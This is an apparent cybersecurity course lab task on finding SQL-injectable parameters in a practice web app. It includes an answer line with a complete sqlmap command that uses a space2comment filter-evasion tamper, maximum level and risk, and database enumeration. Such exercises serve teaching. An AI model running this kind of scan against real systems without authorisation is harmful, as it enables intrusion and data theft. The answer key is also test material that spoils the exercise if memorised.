Tasks

======

0. SQLi - Basic Injection Discovery
The first step in exploiting SQL injection vulnerabilities is to identify which parameters are vulnerable.
Your goal is to identify which parameters in the application’s web pages are susceptible to SQL injection attacks. For that you should:

Access the machine cyber_websec_0x01 through the VPN.
Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
Search for the vulnerable paramters.

R: 
sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --tamper=space2comment --level=5 --risk=3 --dbs

======
